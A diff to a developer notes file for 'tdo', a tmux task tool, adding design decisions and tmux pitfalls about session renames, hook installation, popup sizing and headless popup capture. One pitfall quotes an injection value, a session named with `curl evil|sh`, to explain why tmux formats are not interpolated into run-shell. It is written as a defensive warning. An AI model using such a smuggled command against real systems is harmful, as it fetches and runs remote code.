@@ -33,7 +33,9 @@ shell picks it up, fix PATH rather than downgrading dependencies.
   `internal/cli` and never resolves a scope or reads the clock itself, so
   `Update`/`View` are testable without tmux. Row formatting lives in `render.go`
   as pure functions.
-- `internal/cli` — stdlib `flag` with manual subcommand dispatch.
+- `internal/cli` — stdlib `flag` with manual subcommand dispatch. Also owns the two
+  tmux-facing side jobs: refreshing the `session_id -> name` map on every resolve
+  (`openEnv`) and the `session-renamed` subcommand the tmux hook calls.
 
 ## Decisions worth knowing
 
@@ -68,6 +70,13 @@ shell picks it up, fix PATH rather than downgrading dependencies.
   is that contract alone, pinned bytewise by `testdata/list.json`. Cosmetic churn
   there is a breaking change for anyone's script.
 - **Version** is stamped via `-ldflags -X .../internal/cli.Version`.
+- **The session scope key is the session *name*, so renames need a map.** tmux gives a
+  `session-renamed` hook only the *new* name; the old one — the key the tasks are filed
+  under — is already gone. The `session_id` survives the rename, so v2's `sessions` table
+  maps id -> name and `tdo session-renamed` recovers the old key from it. Filing tasks
+  under the id instead was rejected: ids reset when the server restarts, so every reboot
+  would orphan every session task. The map is best-effort by construction (it only knows
+  sessions tdo has run in) and the all-tasks view's re-home is the backstop.
 
 ## Pitfalls
 
@@ -157,6 +166,37 @@ shell picks it up, fix PATH rather than downgrading dependencies.
   on the style object instead (`textStyle(...).GetStrikethrough()`) and prove the
   escapes ship with `capture-pane -pe`.
 
+- **Never interpolate a tmux format into a `run-shell` string.** Two separate traps meet
+  there. First, `#{session_id}` expands to `$0` and `run-shell` hands its argument to `sh`,
+  which expands `$0` to `sh` — so the id arrives as the literal string "sh". Second, and
+  worse: a session *name* is user data, and no tmux format escapes for a shell
+  (`#{q:...}` escapes for tmux's own parser), so `'#{hook_session_name}'` in sh single
+  quotes executes for a session called `x'; curl evil|sh; '`. Verified on tmux 3.7b, and
+  the reason the installed hook is the bare `run-shell -b 'tdo session-renamed'`: the child
+  inherits `$TMUX`, whose third field is the session the hook fired for, so `tdo` asks tmux
+  itself and nothing is interpolated. That also fixes what the argument form could not — a
+  name containing `:` cannot be used as a tmux target at all.
+- **`set-hook -g` replaces; `set-hook -ga` appends.** A plugin must append or it silently
+  eats the user's own `session-renamed` hook. The cost is that re-running the install
+  stacks duplicate copies (`show-hooks -g` shows `session-renamed[0]`, `[1]`, …); the hook
+  body is idempotent, so this is noise rather than a bug.
+- **`display-popup` does not expand formats in `-w`/`-h`** — tmux 3.7b answers `width
+  invalid`. A floored size therefore has to be a *branch* (`if-shell -F`), not an
+  expression. Two more traps in that condition: `#{>=:x,y}` compares **strings**, so
+  `#{>=:80,100}` is *true*; use arithmetic instead (`#{m:-*,#{e|-|:#{client_width},100}}`
+  is "narrower than 100"). And `display-message -p` **eats a literal `%`**, so a probe
+  printing `60%` shows `60` — which is how a wrong condition can look right.
+- **Popup percentages are of the *client*, and the popup's border costs 2×2.** `-w 60 -h 15`
+  hands the TUI a 58×13 pane; `-w 60% -h 60%` on an 80×24 client hands it 46×12. Use
+  `#{client_width}`/`#{client_height}` in the size condition, not `window_*`.
+- **The popup overlay *can* be captured headlessly, with a nested client.** CLAUDE.md used
+  to say otherwise. `display-popup` needs an attached client, and one can be manufactured:
+  create two sessions, run `TMUX= tmux -L <sock> attach -t work` *inside* the first
+  session's pane, and that pane becomes a real 80×24 client for `work`. Send `C-b T` to the
+  outer pane and `capture-pane` it: the popup, its border and the frame inside it are all
+  in the capture. This is how the keybind, the computed size and the footer width were
+  proven; `-c <client>` is also what makes a scripted `display-popup` stop answering
+  "no current client".
 - **`t.TempDir()` is itself under a symlink on macOS** (`/var` -> `/private/var`),
   so scope tests compare against `normalizePath(tmp)`, never the raw temp path.
 - **Resolution costs one `tmux display-message`** (~5ms of a ~5.7ms cold median),
